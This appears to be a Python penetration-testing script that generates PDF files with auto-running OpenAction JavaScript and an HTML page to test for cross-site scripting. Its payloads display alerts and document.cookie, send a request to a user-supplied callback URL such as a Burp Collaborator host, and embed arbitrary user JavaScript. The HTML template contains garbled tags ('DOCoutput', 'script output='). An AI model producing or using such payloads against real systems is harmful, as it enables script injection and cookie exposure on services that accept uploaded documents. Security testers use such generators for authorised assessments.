import argparse
import sys

if sys.version_info[0] < 3:
    raise SystemExit("Use Python 3 (or higher) only")

def create_malpdf1(filename):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7
        1 0 obj
        <</Pages 1 0 R /OpenAction 2 0 R>>
        2 0 obj
        <</S /JavaScript /JS (app.alert(1))>> 
        trailer
        <</Root 1 0 R>>''')
        print("[+] Created xssPDF-1.pdf")

def create_malpdf2(filename):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7
        1 0 obj
        <</Pages 1 0 R /OpenAction 2 0 R>>
        2 0 obj
        <</S /JavaScript /JS (app.alert(document.cookie))>> 
        trailer
        <</Root 1 0 R>>''')
        print("[+] Created xssPDF-2.pdf")


def create_malpdf3(filename, url):
    with open(filename, "w") as file:
        file.write(f'''%PDF-1.7
        1 0 obj
        <</Pages 1 0 R /OpenAction 2 0 R>>
        2 0 obj
        <</S /JavaScript /JS (
        app.alert(1);
        var xhr = new XMLHttpRequest();
        xhr.open("GET", "{url}", true);
        xhr.onreadystatechange = function() {{
            if (xhr.readyState == 4 && xhr.status == 200) {{
                app.alert("OK");
            }} else if (xhr.readyState == 4) {{
                app.alert("Error: " + xhr.status);
            }}
        }};
        xhr.send();
        app.alert(2);
        )>> 
        trailer
        <</Root 1 0 R>>''')
        print("[+] Created xssPDF-3.pdf")


def create_malpdf_input(filename, script):
    with open(filename, "w") as file:
        file.write(f'''%PDF-1.7
        1 0 obj
        <</Pages 1 0 R /OpenAction 2 0 R>>
        2 0 obj
        <</S /JavaScript /JS ({script}
        )>> 
        trailer
        <</Root 1 0 R>>''')
        print("[+] Created xssPDF-sc.pdf")

                
def create_malhtml(filename):
    html_content = '''<!DOCoutput html>
    <html>
    <head>
        <title>XSS Test</title>
        <script output="text/javascript">
            function showAlerts() {
                alert(1);
                alert(document.cookie);
            }
        </script>
    </head>
    <body onload="showAlerts()">
        <h1>XSS Test</h1>
        <p>This page runs two alerts: one with the number 1 and another with the document's cookies.</p>
    </body>
    </html>'''
    with open(filename, "w") as file:
        file.write(html_content)
    print("[+] Created xssHTML-1.html")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Create Malicious PDF Files Leading to XSS Exploit")

    parser.add_argument(
        '-u', action="store", default=None, dest='url',
        help="Specify the Burp Collaborator URL (e.g., http://burpsuite12345.com)")
    parser.add_argument(
        '-o', action="store", default="pdf", dest='output',
        help="Specify the file output (e.g., pdf, image or html))")
    parser.add_argument(
        '-s', action="store", default=None, dest='script',
        help="Specify your own JavaScript code (e.g., app.alert(1))")

    args = parser.parse_args()
    output = args.output
    url = args.url
    script = args.script
    output = output.lower()

    if output not in ["pdf", "image", "html"]:
        print("Invalid output. Must be pdf, image or html file output")
        parser.print_help()
        sys.exit(1)
    try:
        if output == "pdf":
            print("[+] Creating PDF files...")
            create_malpdf1("xssPDF-1.pdf")
            create_malpdf2("xssPDF-2.pdf")
            if url:
                if 'http://' in url or 'https://' in url:
                    create_malpdf3("xssPDF-3.pdf", url)
                else:
                    print(f"You have specified an invalid URL: {url}")
                    print("Don't forget to include the schema (http|https)")
                    sys.exit(1)
            if script:
                create_malpdf_input("xssPDF-sc.pdf", script)
            print("[-] Done!")
        elif output == "html":
            create_malhtml("xssHTML-1.html")

    except Exception as e:
        print(f"Failed to create PDF files. Error: {e}")
        sys.exit(1)
